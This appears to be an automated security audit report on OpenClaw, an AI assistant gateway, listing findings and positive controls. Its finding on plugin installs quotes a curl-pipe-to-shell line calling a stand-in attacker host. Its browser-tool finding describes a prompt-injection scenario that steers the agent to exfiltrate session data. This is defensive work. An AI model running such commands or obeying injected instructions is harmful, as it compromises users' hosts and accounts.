# OpenClaw Security Audit Report

**Date:** 2026-02-27
**Auditor:** Automated Security Audit (Claude Code)
**Repository:** https://github.com/openclaw/openclaw
**Commit:** HEAD on `main` branch
**Scope:** Full codebase security review (Phases 1-7)

---

## 1. Executive Summary

OpenClaw is a TypeScript/Node.js personal AI assistant framework that connects to over a dozen messaging platforms (WhatsApp, Telegram, Slack, Discord, Signal, iMessage, Teams, Matrix, etc.) and provides a gateway server with multi-agent routing, skills execution, DM policy enforcement, secrets management, and WebSocket communication. Given that it handles credentials for multiple services, processes untrusted inbound messages, and can execute shell commands on behalf of agents, it has a significant attack surface.

Overall, OpenClaw demonstrates a **mature security posture** for an open-source project of this complexity. The codebase includes a comprehensive built-in security audit system (`openclaw security audit`), timing-safe secret comparison, CSP headers, rate limiting on authentication, DM policy enforcement with pairing codes, log redaction of sensitive patterns, sandbox isolation for tool execution, and path traversal protections. The trust model is clearly documented in `SECURITY.md` and appropriately scoped as a "personal assistant" (one trusted operator per gateway).

However, several findings warrant attention. No critical vulnerabilities were identified that would allow unauthenticated remote code execution. The most significant findings relate to defense-in-depth improvements around WebSocket message size limits, the browser tool's eval pattern, and potential credential exposure in certain edge cases.

---

## 2. Risk Matrix

| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 3 |
| Medium | 10 |
| Low | 10 |
| Informational | 6 |
| **Total** | **29** |

---

## 3. Detailed Findings

### OC-SEC-001: Browser Tool Uses eval()/new Function() for Page Evaluation

- **Severity:** High
- **CVSS Estimate:** 7.5
- **Affected Component:** `src/browser/pw-tools-core.interactions.ts:289-351`
- **CWE:** CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)

**Description:** The browser tool's `evaluate` function uses `new Function()` and `eval()` to execute user-provided JavaScript in the browser context via Playwright's `page.evaluate()`. While this executes in the browser sandbox (not the Node.js process), an LLM agent steered by prompt injection could use this to exfiltrate page data, interact with authenticated web sessions, or perform actions on behalf of the user in the browser.

**Attack Scenario:** An attacker sends a crafted message via a messaging channel that causes the AI agent to invoke the browser `evaluate` tool with malicious JavaScript. If the browser has active sessions (cookies, auth tokens), the attacker could exfiltrate session data or perform unauthorized actions.

**Evidence:** Lines 289-296 and 330-336 use `new Function()` + `eval("(" + fnBody + ")")` pattern.

**Recommended Fix:**
- Consider implementing a strict allowlist of permitted browser evaluation operations
- Add content-security-policy restrictions to the browser sandbox
- Log all browser evaluate calls for audit purposes
- Consider sandboxing the browser in a separate Docker container (which is already supported via `Dockerfile.sandbox-browser`)

**References:** CWE-95, OWASP A03:2021 Injection

---

### OC-SEC-002: Pairing Code Entropy May Allow Targeted Brute-Force

- **Severity:** High
- **CVSS Estimate:** 6.8
- **Affected Component:** `src/pairing/pairing-store.ts:13-14, 187-195`
- **CWE:** CWE-330 (Use of Insufficiently Random Values)

**Description:** The pairing code system uses 8-character codes from a 32-character alphabet (`ABCDEFGHJKLMNPQRSTUVWXYZ23456789`), giving approximately 32^8 = ~1.1 trillion possible codes. However, the system limits active pairing requests to `PAIRING_PENDING_MAX = 3` per channel, and codes expire after 1 hour (`PAIRING_PENDING_TTL_MS = 60 * 60 * 1000`). While the code space is large, there is no rate limiting on pairing code submission attempts at the channel level - an attacker who can send messages on the channel could attempt many codes rapidly.

**Attack Scenario:** An attacker on a messaging platform attempts to brute-force the 8-character pairing code by sending many messages with different codes. With 3 active codes and ~1.1 trillion possibilities, a pure brute-force is infeasible, but if platform rate limits are the only barrier, and the attacker has automation, the attack window is 1 hour per code.

**Mitigating Factors:**
- The code space (32^8) is very large
- Only 3 pending codes at once
- 1-hour TTL limits the attack window
- Channel platforms themselves have rate limits
- The pairing code must match a specific pending request

**Recommended Fix:**
- Add explicit rate limiting on pairing code verification attempts (e.g., max 5 attempts per sender per minute)
- Consider implementing exponential backoff after failed pairing attempts
- Log failed pairing attempts for monitoring

**References:** CWE-330, CWE-307 (Improper Restriction of Excessive Authentication Attempts)

---

### OC-SEC-003: WebSocket Messages Lack Explicit Size Limits

- **Severity:** Medium
- **CVSS Estimate:** 5.3
- **Affected Component:** `src/gateway/server/ws-connection.ts`
- **CWE:** CWE-770 (Allocation of Resources Without Limits)

**Description:** The WebSocket connection handler in the gateway does not appear to set explicit `maxPayload` limits on the WebSocket server. The `ws` library defaults to 100 MiB max payload size. An authenticated client could send very large messages to consume server memory.

**Attack Scenario:** An authenticated gateway client sends a series of extremely large WebSocket frames (up to 100 MiB each), potentially causing memory exhaustion on the gateway server.

**Mitigating Factors:**
- Requires authenticated connection (gateway token/password)
- The trust model treats authenticated callers as trusted operators
- JSON parsing of large payloads may fail before consuming all memory

**Recommended Fix:**
- Set explicit `maxPayload` on the WebSocket server (e.g., 10 MiB)
- Add per-connection message rate limiting
- Monitor and log abnormally large messages

**References:** CWE-770, CWE-400 (Uncontrolled Resource Consumption)

---

### OC-SEC-004: Loopback Auth Rate Limiting Exemption

- **Severity:** Medium
- **CVSS Estimate:** 5.0
- **Affected Component:** `src/gateway/auth-rate-limit.ts:99, 131-133`
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Description:** The authentication rate limiter explicitly exempts loopback addresses (`127.0.0.1`, `::1`) from rate limiting (`exemptLoopback` defaults to `true`). While this is intentional to prevent CLI lockout, it means any process running on the same machine can perform unlimited authentication attempts without rate limiting.

**Attack Scenario:** A malicious process running on the same host as the OpenClaw gateway (e.g., compromised browser extension, malicious npm package in development) can brute-force the gateway token without any rate limiting.

**Mitigating Factors:**
- If an attacker has local access, they likely already have access to the config files
- The trust model assumes the local host is a trusted boundary
- Gateway tokens should have high entropy (recommended: `openssl rand -hex 32`)

**Recommended Fix:**
- Consider adding a configurable option to enable rate limiting even for loopback
- Add warning in security audit when gateway token has low entropy
- Document the risk clearly for shared-machine deployments

**References:** CWE-307, OWASP A07:2021 Identification and Authentication Failures

---

### OC-SEC-005: CSP Allows unsafe-inline for Styles

- **Severity:** Medium
- **CVSS Estimate:** 4.3
- **Affected Component:** `src/gateway/control-ui-csp.ts:10`
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Description:** The Content Security Policy for the Control UI includes `style-src 'self' 'unsafe-inline'`, which allows inline styles. While `script-src 'self'` properly restricts scripts, CSS injection can be used for data exfiltration via CSS selectors in certain contexts.

**Mitigating Factors:**
- `script-src 'self'` prevents script injection
- `frame-ancestors 'none'` prevents clickjacking
- The Control UI is intended for loopback-only access
- CSS-based attacks are limited in scope

**Recommended Fix:**
- Consider using CSS nonces or hashes instead of `unsafe-inline` for styles
- This is low priority given the loopback-only intended deployment

**References:** CWE-1021, OWASP A05:2021 Security Misconfiguration

---

### OC-SEC-006: Docker Compose Uses Default LAN Binding

- **Severity:** Medium
- **CVSS Estimate:** 5.5
- **Affected Component:** `docker-compose.yml:25`
- **CWE:** CWE-668 (Exposure of Resource to Wrong Sphere)

**Description:** The `docker-compose.yml` defaults the gateway bind to `lan` via `${OPENCLAW_GATEWAY_BIND:-lan}`, while the Dockerfile defaults to loopback. This means Docker Compose deployments will bind to all LAN interfaces by default, potentially exposing the gateway to the local network.

**Attack Scenario:** A user runs `docker-compose up` without setting `OPENCLAW_GATEWAY_BIND`, and the gateway becomes accessible to all devices on the local network. If no gateway token is configured, the gateway is unauthenticated.

**Mitigating Factors:**
- Docker networking may provide some isolation
- The `--allow-unconfigured` flag in the Dockerfile CMD suggests a development/getting-started default
- Users should configure `OPENCLAW_GATEWAY_TOKEN` before deploying

**Recommended Fix:**
- Change the docker-compose default to `loopback` to match the Dockerfile
- Add a prominent comment about setting `OPENCLAW_GATEWAY_TOKEN`
- Consider refusing to start in LAN mode without authentication configured

**References:** CWE-668, OWASP A05:2021 Security Misconfiguration

---

### OC-SEC-007: HSTS Header Only Applied When Explicitly Configured

- **Severity:** Medium
- **CVSS Estimate:** 4.0
- **Affected Component:** `src/gateway/http-common.ts:17-20`
- **CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)

**Description:** The `Strict-Transport-Security` header is only set when explicitly configured via `opts.strictTransportSecurity`. For TLS-enabled deployments (e.g., with Tailscale serve/funnel), this header may not be set, allowing potential downgrade attacks.

**Mitigating Factors:**
- Most deployments are loopback-only (HSTS not applicable)
- Tailscale provides its own transport security
- The gateway is not intended for public internet exposure

**Recommended Fix:**
- Auto-enable HSTS when TLS is active (`gateway.tls.enabled = true`)
- Log a warning in security audit when TLS is enabled without HSTS

**References:** CWE-319, OWASP A02:2021 Cryptographic Failures

---

### OC-SEC-008: No X-Frame-Options on Non-Control-UI Responses

- **Severity:** Medium
- **CVSS Estimate:** 4.0
- **Affected Component:** `src/gateway/http-common.ts:11`
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

**Description:** The `setDefaultSecurityHeaders` function does not set `X-Frame-Options` by design (comment says "some handlers serve content that may be loaded inside frames"). This means API responses and other non-canvas endpoints could potentially be loaded in iframes, though the JSON content type mitigates most clickjacking risks.

**Mitigating Factors:**
- Control UI has its own CSP with `frame-ancestors 'none'`
- JSON API responses are not renderable in iframes
- Canvas content is intentionally frameable for legitimate use

**Recommended Fix:**
- Add `X-Frame-Options: DENY` to non-canvas HTTP responses
- This is already partially addressed by the Control UI CSP

**References:** CWE-1021

---

### OC-SEC-009: Pairing Setup Code Embeds Gateway Token in Base64

- **Severity:** Medium
- **CVSS Estimate:** 5.0
- **Affected Component:** `src/pairing/setup-code.ts:260-264`
- **CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

**Description:** The `encodePairingSetupCode` function encodes the gateway URL and authentication token/password as a base64-encoded JSON payload. This QR code / setup code contains the full gateway credential in cleartext (only base64-encoded, not encrypted). If the setup code is intercepted (screenshot, shoulder surfing, insecure transmission), the gateway credential is exposed.

**Attack Scenario:** A user generates a pairing setup code that contains their gateway token. The code is shared via an insecure channel (unencrypted chat, screenshot) and an attacker decodes the base64 to extract the gateway token.

**Mitigating Factors:**
- The setup code is intended for one-time use during device pairing
- Users are expected to use the code in person or via secure channels
- The code is only generated on explicit user action

**Recommended Fix:**
- Consider implementing a time-limited, single-use token exchange instead of embedding the long-lived gateway credential
- Add a warning when generating setup codes about secure handling
- Consider encrypting the setup payload with a PIN

**References:** CWE-312, CWE-522 (Insufficiently Protected Credentials)

---

### OC-SEC-010: Secrets Stored as Plaintext JSON Files

- **Severity:** Low
- **CVSS Estimate:** 3.5
- **Affected Component:** `src/pairing/pairing-store.ts`, `src/secrets/`
- **CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

**Description:** API keys, channel tokens, and pairing data are stored as plaintext JSON files under `~/.openclaw/`. While file permissions should restrict access to the owner, the secrets are not encrypted at rest. The `SECURITY.md` acknowledges this: "Anyone who can modify `~/.openclaw` state/config is effectively a trusted operator."

**Mitigating Factors:**
- The trust model explicitly treats `~/.openclaw` as a trusted operator boundary
- File system permissions should restrict access
- This is consistent with how most CLI tools store credentials (e.g., `~/.docker/config.json`, `~/.aws/credentials`)

**Recommended Fix:**
- Consider offering optional encryption at rest for the credentials directory
- Ensure file permissions are restrictive (600) on credential files
- The built-in security audit already checks for overly permissive file permissions

**References:** CWE-312

---

### OC-SEC-011: Known Vulnerability in fast-xml-parser Dependency

- **Severity:** Low
- **CVSS Estimate:** 3.1
- **Affected Component:** `package.json` (pnpm override at line 246)
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)

**Description:** The project pins `fast-xml-parser` to version 5.3.6 via pnpm override. This version is affected by CVE-2026-27942 (stack overflow DoS when using `preserveOrder: true`). The vulnerable path is: `openclaw > @aws-sdk/client-bedrock > @aws-sdk/core > @aws-sdk/xml-builder > fast-xml-parser@5.3.6`.

**Recommended Fix:** Update the pnpm override from `"fast-xml-parser": "5.3.6"` to `"fast-xml-parser": "5.3.8"` or later.

**References:** CVE-2026-27942, GHSA-fj3w-jwp8-x2g3

---

### OC-SEC-012: Multiple Pre-Release Dependencies in Use

- **Severity:** Low
- **CVSS Estimate:** 2.5
- **Affected Component:** `package.json` (dependencies section)
- **CWE:** CWE-1104 (Use of Unmaintained Third-Party Components)

**Description:** Several dependencies are pre-release versions:
- `@whiskeysockets/baileys@7.0.0-rc.9` (WhatsApp Web reverse-engineering)
- `@buape/carbon@0.0.0-beta-20260216184201` (Discord framework)
- `@lydell/node-pty@1.2.0-beta.3` (PTY native bindings)
- `sqlite-vec@0.1.7-alpha.2` (SQLite vector extension)

Pre-release packages carry higher risk of bugs, security issues, and breaking changes.

**Mitigating Factors:**
- All are pinned to exact versions
- `@buape/carbon` has explicit "never update" policy in CLAUDE.md
- These are specialized packages where stable alternatives may not exist

**Recommended Fix:** Monitor these packages for stable releases and upgrade when available.

**References:** CWE-1104

---

### OC-SEC-013: Channel Path Sanitization Uses Replace Instead of Strict Validation

- **Severity:** Low
- **CVSS Estimate:** 3.0
- **Affected Component:** `src/pairing/pairing-store.ts:54-64`
- **CWE:** CWE-22 (Improper Limitation of a Pathname)

**Description:** The `safeChannelKey` function sanitizes channel IDs for use in filenames by replacing dangerous characters. While `..` is replaced with `_`, the approach uses allowlisting-by-replacement rather than strict validation against a known-good pattern.

**Evidence:**
```typescript
const safe = raw.replace(/[\\/:*?"<>|]/g, "_").replace(/\.\./g, "_");
```

**Mitigating Factors:**
- The double-dot replacement prevents path traversal
- Channel IDs come from a controlled set of known channel types
- The function throws on empty or `_`-only results

**Recommended Fix:**
- Consider using a strict allowlist regex (e.g., `/^[a-z0-9-]+$/`) instead of character replacement
- This is defense-in-depth; the current implementation appears safe for known channel IDs

**References:** CWE-22

---

### OC-SEC-014: Timing-Safe Comparison Uses SHA-256 Hashing

- **Severity:** Low (Informational - Positive Finding)
- **Affected Component:** `src/security/secret-equal.ts:1-12`

**Description:** The `safeEqualSecret` function correctly uses `crypto.timingSafeEqual` with SHA-256 hashing to compare secrets. The hashing step ensures equal-length comparison even for different-length inputs. This is a well-implemented security control.

**Assessment:** No action needed. This is a positive finding.

---

### OC-SEC-015: Log Redaction System Is Comprehensive

- **Severity:** Low (Informational - Positive Finding)
- **Affected Component:** `src/logging/redact.ts`

**Description:** The log redaction system includes patterns for:
- ENV-style assignments (KEY, TOKEN, SECRET, PASSWORD)
- JSON fields (apiKey, token, secret, password, accessToken)
- CLI flags (--api-key, --token, --secret, --password)
- Authorization/Bearer headers
- PEM private keys
- Common token prefixes (sk-, ghp_, github_pat_, xoxb-, xapp-, gsk_, AIza, pplx-, npm_)
- Telegram bot tokens

The system uses `compileSafeRegex` for ReDoS prevention and supports configurable patterns.

**Assessment:** Excellent implementation. The redaction coverage is thorough.

---

### OC-SEC-016: Security Path Canonicalization Handles Encoding Bypasses

- **Severity:** Low (Informational - Positive Finding)
- **Affected Component:** `src/gateway/security-path.ts`

**Description:** The `canonicalizePathForSecurity` function performs multi-pass URL decoding (up to 3 passes), dot-segment resolution, path separator normalization, and case normalization. It also handles malformed percent-encoding by failing closed (treating it as a match if the raw path matches a protected prefix).

**Assessment:** Excellent defense-in-depth against path traversal and encoding bypass attacks.

---

### OC-SEC-017: Docker Image Runs as Non-Root User

- **Severity:** Low (Informational - Positive Finding)
- **Affected Component:** `Dockerfile:64`

**Description:** The production Dockerfile correctly runs as the `node` user (UID 1000), uses a pinned base image digest, and binds to loopback by default. The `SECURITY.md` recommends additional hardening with `--read-only` and `--cap-drop=ALL`.

**Assessment:** Good security posture for container deployments.

---

### OC-SEC-018: Pre-Release Bun Install Script Downloaded via Curl-Pipe-Bash

- **Severity:** Low
- **CVSS Estimate:** 2.0
- **Affected Component:** `Dockerfile:4`
- **CWE:** CWE-494 (Download of Code Without Integrity Check)

**Description:** The Dockerfile installs Bun via `curl -fsSL https://bun.sh/install | bash`, which downloads and executes a remote script without integrity verification. While this is a common pattern, it means a compromise of `bun.sh` or MITM attack during Docker build could inject malicious code.

**Mitigating Factors:**
- Bun is installed during build time only, not at runtime
- The base image digest is pinned (supply chain protection for the base)
- This pattern is extremely common in the ecosystem

**Recommended Fix:**
- Consider pinning a specific Bun version and verifying checksum
- Or use the official Bun Docker image as a builder stage

**References:** CWE-494

---

### OC-SEC-019: Control Plane Rate Limit Is Per-Device/IP, Not Global

- **Severity:** Low
- **CVSS Estimate:** 3.0
- **Affected Component:** `src/gateway/control-plane-rate-limit.ts`
- **CWE:** CWE-770 (Allocation of Resources Without Limits)

**Description:** The control plane write rate limiter allows 3 requests per 60 seconds per device/IP combination. An attacker with access to many IP addresses could bypass this per-IP limit. However, all control plane operations require authentication first.

**Mitigating Factors:**
- Authentication is required before rate limiting is relevant
- The trust model treats authenticated users as trusted operators
- The rate limiter has a cleanup mechanism

**Recommended Fix:**
- Consider adding a global rate limit in addition to per-IP
- This is low priority given the authentication requirement

**References:** CWE-770

---

### OC-SEC-020: pnpm.onlyBuiltDependencies Is Well-Configured

- **Severity:** Informational (Positive Finding)
- **Affected Component:** `package.json` (lines 257-268)

**Description:** The project uses `pnpm.onlyBuiltDependencies` to restrict which packages can execute install scripts to a vetted allowlist of 10 packages. This is an excellent supply chain security control that prevents arbitrary postinstall script execution from transitive dependencies.

Additionally, `pnpm.minimumReleaseAge: 2880` (48 hours) prevents installing packages published less than 2 days ago, mitigating supply chain attacks from newly-published malicious packages.

**Assessment:** Excellent supply chain hardening.

---

### OC-SEC-021: Webhook Signature Verification Present for Slack

- **Severity:** Low
- **CVSS Estimate:** N/A (Informational)
- **Affected Component:** `src/slack/monitor/provider.ts:92`, `src/slack/http/`

**Description:** Slack webhook signature verification using the signing secret is implemented. The code warns when the signing secret is missing. Other channels (Telegram, Discord) use different authentication mechanisms appropriate to their platforms (bot tokens, webhook secrets).

**Assessment:** Webhook authentication is appropriately handled per channel platform requirements.

---

### OC-SEC-022: Built-In Security Audit System

- **Severity:** Informational (Positive Finding)
- **Affected Component:** `src/security/audit.ts`, `src/security/audit-*.ts`

**Description:** OpenClaw includes a comprehensive built-in security audit system (`openclaw security audit`) that checks for:
- Dangerous config flags
- Channel-specific security issues
- File system permissions
- Tool policy configuration
- Sandbox configuration
- Plugin trust settings
- Gateway HTTP auth configuration
- Multi-user setup detection
- Secrets in config files
- Model hygiene

This self-audit capability with `--deep` and `--fix` modes is an exceptional security practice for an open-source project.

**Assessment:** Excellent. This provides ongoing security monitoring beyond point-in-time audits.

---

### OC-SEC-023: Plugin Security Scanner Is Warn-Only; Does Not Block Malicious Installs

- **Severity:** High
- **CVSS Estimate:** 7.0
- **Affected Component:** `src/plugins/install.ts:199-221`
- **CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

**Description:** The `installPluginFromPackageDir` function runs a security scan (`skillScanner.scanDirectoryWithSummary()`) that detects dangerous patterns (child_process, eval, crypto-mining, data exfiltration) in plugin code. However, the scan is explicitly warn-only and never blocks installation. Even critical findings only produce a `logger.warn()`. Once installed, plugin code executes with full gateway process privileges via the `jiti` loader.

**Attack Scenario:** An attacker publishes a malicious npm package as an OpenClaw plugin. A user installs it via `openclaw plugin install`. The scanner detects `child_process.exec("curl evil.com | sh")` and logs a warning, but the plugin is installed anyway. On gateway start, it executes with full host access.

**Recommended Fix:**
- Block installation by default when critical findings are detected
- Require explicit `--force` or `--allow-unsafe` flag to override
- Or require interactive user confirmation when critical findings are detected

**References:** CWE-829, OWASP A08:2021 Software and Data Integrity Failures

---

### OC-SEC-024: Web Search Tool SSRF Policy Allows Private Network Access

- **Severity:** Medium
- **CVSS Estimate:** 5.5
- **Affected Component:** `src/agents/tools/web-guarded-fetch.ts:8-10`, `src/agents/tools/web-search.ts:617,724`
- **CWE:** CWE-918 (Server-Side Request Forgery)

**Description:** The `web_search` tool uses `WEB_TOOLS_TRUSTED_NETWORK_SSRF_POLICY` which sets `dangerouslyAllowPrivateNetwork: true`. This means when the agent performs web searches and follows result URLs, the fetches can reach private/internal network addresses (10.x.x.x, 192.168.x.x, 127.0.0.1, cloud metadata endpoints like 169.254.169.254).

**Mitigating Factors:** The `web_fetch` tool (for direct user-specified URL fetching) uses the default restrictive SSRF policy. Only the search provider API call paths use the relaxed policy.

**Recommended Fix:** Apply the default restrictive SSRF policy for search provider calls unless the operator explicitly opts into private network access.

**References:** CWE-918, OWASP A10:2021 Server-Side Request Forgery

---

### OC-SEC-025: No WebSocket Connection Count Limit

- **Severity:** Medium
- **CVSS Estimate:** 5.0
- **Affected Component:** `src/gateway/server-runtime-state.ts:167-170`
- **CWE:** CWE-770 (Allocation of Resources Without Limits)

**Description:** The WebSocket server is created with no `maxConnections` or similar cap. The `clients` set grows unboundedly. An attacker who can reach the WS port can open thousands of connections (each holding a socket, timer, and event listeners for up to 10 seconds), consuming file descriptors and memory.

**Recommended Fix:** Add a configurable maximum WebSocket connection count. Reject new upgrade requests with HTTP 503 when the limit is reached.

**References:** CWE-770

---

### OC-SEC-026: No Per-IP WebSocket Connection Limit

- **Severity:** Medium
- **CVSS Estimate:** 5.0
- **Affected Component:** `src/gateway/server-http.ts:642-685`
- **CWE:** CWE-770 (Allocation of Resources Without Limits)

**Description:** The WebSocket upgrade handler does not track how many connections a single IP has open. A single IP can open unlimited concurrent WebSocket connections, each consuming resources before authentication.

**Recommended Fix:** Add per-IP connection counting at the upgrade handler level. Reject upgrades from IPs exceeding a threshold (e.g., 50 concurrent connections).

**References:** CWE-770

---

### OC-SEC-027: Origin Validation Deferred Past WebSocket Upgrade

- **Severity:** Low
- **CVSS Estimate:** 3.5
- **Affected Component:** `src/gateway/server-http.ts:642-685`
- **CWE:** CWE-346 (Origin Validation Error)

**Description:** The HTTP upgrade handler does not perform origin validation. Origin checking is deferred until after the WebSocket is established and the connect handshake message is received. This means a browser from a malicious origin can complete the WS upgrade, receive the challenge nonce, and only then be rejected at the application level.

**Recommended Fix:** Move origin checking to the upgrade handler. If the `Origin` header is present and not allowed, reject the upgrade before calling `wss.handleUpgrade()`.

**References:** CWE-346

---

### OC-SEC-028: No HTTP Request Rate Limiting Beyond Authentication

- **Severity:** Medium
- **CVSS Estimate:** 4.5
- **Affected Component:** `src/gateway/server-http.ts:491-627`
- **CWE:** CWE-770 (Allocation of Resources Without Limits)

**Description:** HTTP endpoints (OpenAI-compatible chat at `/v1/chat/completions`, OpenResponses at `/v1/responses`, canvas host, control UI) have auth checks but no general request rate limiting. A client with a valid token can issue unlimited requests, potentially causing resource exhaustion and LLM API cost overruns.

**Mitigating Factors:** The trust model treats authenticated callers as trusted operators. The `/v1/responses` endpoint has a 20MB body limit.

**Recommended Fix:** Consider optional per-token request rate limiting for HTTP API endpoints, configurable in `gateway.http.rateLimit`.

**References:** CWE-770

---

### OC-SEC-029: SSRF Protection in Codebase Is Comprehensive

- **Severity:** Informational (Positive Finding)
- **Affected Component:** `src/infra/net/ssrf.ts`, `src/infra/net/fetch-guard.ts`

**Description:** The SSRF protection system includes:
- Two-phase protection: pre-DNS hostname blocking + post-DNS address verification (prevents DNS rebinding)
- Blocks localhost, `.local`, `.internal`, cloud metadata endpoints (169.254.169.254)
- Handles IPv4-mapped IPv6, legacy/non-canonical IPv4 literals (octal, hex)
- DNS pinning to prevent TOCTOU attacks
- Cross-origin redirect header stripping (Authorization, Cookie, Proxy-Authorization)
- Redirect count limiting (default 3)

**Assessment:** Excellent implementation. One of the strongest SSRF defenses seen in an open-source project.

---

## 4. Positive Security Controls

The following security controls are well-implemented and deserve recognition:

1. **Timing-safe secret comparison** (`src/security/secret-equal.ts`) - Uses SHA-256 + `timingSafeEqual`
2. **Authentication rate limiting** (`src/gateway/auth-rate-limit.ts`) - Sliding window with lockout
3. **Log redaction** (`src/logging/redact.ts`) - Comprehensive pattern matching for secrets
4. **CSP headers** (`src/gateway/control-ui-csp.ts`) - Restrictive policy for Control UI
5. **Path canonicalization** (`src/gateway/security-path.ts`) - Multi-pass decoding with fail-closed behavior
6. **DM policy enforcement** (`src/security/dm-policy-shared.ts`) - Pairing/allowlist/open modes
7. **ReDoS prevention** (`src/security/safe-regex.ts`) - Safe regex compilation
8. **Unauthorized flood guard** (`src/gateway/server/ws-connection/unauthorized-flood-guard.ts`)
9. **Channel path sanitization** (`src/pairing/pairing-store.ts`) - Path traversal prevention
10. **Docker security** - Non-root user, pinned base image, loopback default binding
11. **Supply chain controls** - `pnpm.onlyBuiltDependencies`, `minimumReleaseAge`, version pinning
12. **Built-in security audit** (`openclaw security audit`) - Self-assessment capability
13. **Origin checking** (`src/gateway/origin-check.ts`) - Browser origin validation for WebSocket
14. **Skill scanner** (`src/security/skill-scanner.ts`) - Detects dangerous patterns in skills
15. **Temp path guard** (`src/security/temp-path-guard.ts`) - Sandbox temp folder isolation
16. **SSRF protection** (`src/infra/net/ssrf.ts`) - DNS pinning, two-phase validation, metadata endpoint blocking
17. **Symlink/hardlink protection** (`src/infra/fs-safe.ts`) - O_NOFOLLOW, real path verification, TOCTOU-resistant checks
18. **External content wrapping** (`src/security/external-content.ts`) - Randomized boundary markers, homoglyph detection
19. **Exec approval system** (`src/infra/exec-approvals.ts`) - Multi-tier allowlist with hash-based concurrency control
20. **Environment hardening** (`src/infra/host-env-security.ts`) - Blocklist for dangerous env vars (NODE_OPTIONS, LD_PRELOAD, BASH_ENV)
21. **File permissions** - Credentials written with `0o600`, directories with `0o700`, security fix command to repair permissions
22. **NPM spec validation** (`src/infra/npm-registry-spec.ts`) - Rejects URLs, git refs, protocol specs in package names
23. **Hooks token separation** (`src/gateway/startup-auth.ts`) - Hooks token must differ from gateway auth token

---

## 5. Recommendations (Prioritized by Risk and Effort)

### High Priority
1. **Make plugin scanner block critical findings by default** - Prevent malicious plugin installation without explicit override (OC-SEC-023)
2. **Add rate limiting to pairing code verification** - Prevent brute-force attempts on pairing codes (OC-SEC-002)
3. **Review browser evaluate tool usage** - Consider additional sandboxing or network restrictions on browser eval (OC-SEC-001)

### Medium Priority
4. **Add WebSocket connection count limits** - Prevent file descriptor and memory exhaustion (OC-SEC-025, OC-SEC-026)
5. **Restrict web_search SSRF policy** - Remove `dangerouslyAllowPrivateNetwork` from search tool (OC-SEC-024)
6. **Change docker-compose default to loopback** - Match Dockerfile security posture (OC-SEC-006)
7. **Consider time-limited token exchange for pairing** - Don't embed long-lived credentials in setup codes (OC-SEC-009)
8. **Update fast-xml-parser** - Bump override to >=5.3.8 (OC-SEC-011)
9. **Auto-enable HSTS for TLS deployments** (OC-SEC-007)
10. **Add optional HTTP request rate limiting** for authenticated API endpoints (OC-SEC-028)

### Low Priority
11. **Move origin checking to WS upgrade handler** - Reject bad origins before establishing WS connection (OC-SEC-027)
12. **Add X-Frame-Options to non-canvas responses** (OC-SEC-008)
13. **Consider strict validation for channel IDs** (OC-SEC-013)
14. **Pin Bun version with checksum in Dockerfile** (OC-SEC-018)
15. **Monitor pre-release dependencies** for stable releases (OC-SEC-012)
16. **Consider configurable loopback rate-limit exemption** (OC-SEC-004)

---

## 6. Appendix

### 6.1 Methodology

This audit followed a 7-phase approach:
1. **Reconnaissance** - Directory structure mapping, entry point identification
2. **Authentication & Authorization** - Gateway auth, DM policy, pairing, secrets management
3. **Input Validation & Injection** - Command injection, SSRF, cross-channel injection, config injection
4. **Data Security & Privacy** - Message storage, credential exposure, network security, filesystem security
5. **Infrastructure & Deployment** - Docker security, daemon security, update mechanism
6. **WebSocket & Real-time Security** - WS server, origin validation, session management, rate limiting
7. **Dependency & Supply Chain** - npm audit, dependency analysis, skill supply chain

### 6.2 Tools Used
- Static code analysis (manual review via automated agents)
- Pattern matching (grep/ripgrep for security-sensitive patterns)
- Dependency audit (pnpm audit)
- Configuration review (Dockerfile, docker-compose, .env, .gitignore)

### 6.3 Scope
- **In scope:** All TypeScript source code under `src/`, `extensions/`, Docker/deployment files, configuration files, dependency analysis
- **Out of scope:** Mobile apps (`apps/ios`, `apps/android`, `apps/macos`), Swabble voice engine, third-party vendor code (`vendor/`), runtime testing with live services
- **Trust model alignment:** Findings are assessed against the documented trust model in `SECURITY.md` (one-user, single trusted operator per gateway)

### 6.4 Files Analyzed (Key Security Files)

| Category | Key Files |
|----------|-----------|
| Gateway Auth | `src/gateway/auth.ts`, `auth-rate-limit.ts`, `device-auth.ts`, `startup-auth.ts` |
| HTTP Security | `src/gateway/http-common.ts`, `server-http.ts`, `origin-check.ts`, `security-path.ts`, `control-ui-csp.ts` |
| WebSocket | `src/gateway/server/ws-connection.ts`, `ws-connection/unauthorized-flood-guard.ts`, `ws-connection/message-handler.ts` |
| DM Policy | `src/security/dm-policy-shared.ts`, `src/channels/allow-from.ts`, `command-gating.ts` |
| Pairing | `src/pairing/pairing-store.ts`, `pairing-challenge.ts`, `setup-code.ts` |
| Secrets | `src/security/secret-equal.ts`, `src/secrets/*`, `src/logging/redact.ts` |
| Exec/Tools | `src/agents/bash-tools.exec.ts`, `src/browser/pw-tools-core.interactions.ts` |
| Security Audit | `src/security/audit.ts`, `audit-channel.ts`, `audit-extra.ts`, `audit-fs.ts` |
| Docker | `Dockerfile`, `Dockerfile.sandbox*`, `docker-compose.yml` |
| Supply Chain | `package.json` (dependencies, overrides, onlyBuiltDependencies) |

### 6.5 Disclosure

This report was generated as part of a security audit exercise. Findings should be assessed by the OpenClaw security team for applicability and prioritization within the project's threat model. Per `SECURITY.md`, several finding patterns may be considered out-of-scope (e.g., prompt injection without boundary bypass, operator-intended features, trusted-plugin behavior).
